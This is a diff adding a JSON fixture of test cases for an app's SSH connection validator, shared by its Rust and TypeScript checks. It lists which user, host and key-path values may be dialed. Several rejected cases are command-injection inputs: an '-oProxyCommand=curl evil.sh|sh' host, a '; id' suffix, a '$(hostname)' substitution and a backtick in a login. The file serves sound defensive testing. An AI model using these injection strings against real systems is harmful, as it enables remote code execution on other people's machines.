@@ -1,0 +1,143 @@
+{
+  "why": [
+    "One table, read by both halves of the app, so the two answers to \"can this",
+    "laptop dial that?\" cannot drift apart in silence.",
+    "",
+    "Rust's `cloudbox::is_dialable` is the authority: every place that reaches a",
+    "machine passes through it, whether the address came out of the machine book",
+    "or out of the connect wizard's form. The frontend keeps one small copy",
+    "(`lib/place/boot.ts`) because a form validates as you type and a button that",
+    "opens a terminal has to be enabled or disabled before anything is asked —",
+    "neither can afford a round trip per keystroke.",
+    "",
+    "A copy that quietly stopped agreeing would show up as a button that is",
+    "enabled and then fails, or worse, one that is disabled on an address that",
+    "works. So both read this file. Change one implementation and its own test",
+    "fails here; change the rule for real and both have to be updated together.",
+    "",
+    "Note what is NOT a rule: a space, a quote or an apostrophe in the KEY PATH.",
+    "That path never reaches a shell unquoted — see quoting.cases.json — so",
+    "refusing it would only lock people out of their own key."
+  ],
+  "cases": [
+    {
+      "user": "ubuntu",
+      "host": "203.0.113.10",
+      "key_path": "/Users/mo/keys/box.pem",
+      "dialable": true,
+      "why": "an address and a key: the ordinary machine"
+    },
+    {
+      "user": "ubuntu",
+      "host": "box.example.com",
+      "key_path": "~/keys/box.pem",
+      "dialable": true,
+      "why": "a name rather than a number, and a key under the home directory"
+    },
+    {
+      "user": "ec2-user",
+      "host": "build-box-1",
+      "key_path": "/k.pem",
+      "dialable": true,
+      "why": "dashes and digits are what real hostnames are made of"
+    },
+    {
+      "user": "ubuntu",
+      "host": "box.example",
+      "key_path": "/Users/mo/My Keys/box.pem",
+      "dialable": true,
+      "why": "a space in the key path is quoted, not refused"
+    },
+    {
+      "user": "ubuntu",
+      "host": "box.example",
+      "key_path": "~/keys/mo's.pem",
+      "dialable": true,
+      "why": "so is an apostrophe"
+    },
+    {
+      "user": "ubuntu",
+      "host": "-oProxyCommand=curl evil.sh|sh",
+      "key_path": "/k.pem",
+      "dialable": false,
+      "why": "a host that is really an ssh option: the whole reason this check exists"
+    },
+    {
+      "user": "ubuntu",
+      "host": "box.example; id",
+      "key_path": "/k.pem",
+      "dialable": false,
+      "why": "a second command hiding in a host"
+    },
+    {
+      "user": "ubuntu",
+      "host": "$(hostname)",
+      "key_path": "/k.pem",
+      "dialable": false,
+      "why": "a substitution hiding in a host"
+    },
+    {
+      "user": "ubuntu",
+      "host": "box example",
+      "key_path": "/k.pem",
+      "dialable": false,
+      "why": "a space would split one argument into two"
+    },
+    {
+      "user": "u name",
+      "host": "box.example",
+      "key_path": "/k.pem",
+      "dialable": false,
+      "why": "the same, on the login side"
+    },
+    {
+      "user": "ubuntu`id`",
+      "host": "box.example",
+      "key_path": "/k.pem",
+      "dialable": false,
+      "why": "a backtick in a login"
+    },
+    {
+      "user": "",
+      "host": "box.example",
+      "key_path": "/k.pem",
+      "dialable": false,
+      "why": "no login is not a login"
+    },
+    {
+      "user": "ubuntu",
+      "host": "",
+      "key_path": "/k.pem",
+      "dialable": false,
+      "why": "no host is nowhere"
+    },
+    {
+      "user": "ubuntu",
+      "host": "   ",
+      "key_path": "/k.pem",
+      "dialable": false,
+      "why": "and neither is whitespace"
+    },
+    {
+      "user": "ubuntu",
+      "host": "box.example",
+      "key_path": "   ",
+      "dialable": false,
+      "why": "a key path of spaces means the box will ask for a password nobody can type"
+    },
+    {
+      "user": "ubuntu",
+      "host": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+      "key_path": "/k.pem",
+      "dialable": true,
+      "why": "255 characters is the longest a host may be"
+    },
+    {
+      "user": "ubuntu",
+      "host": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+      "key_path": "/k.pem",
+      "dialable": false,
+      "why": "256 is one too many"
+    }
+  ]
+}
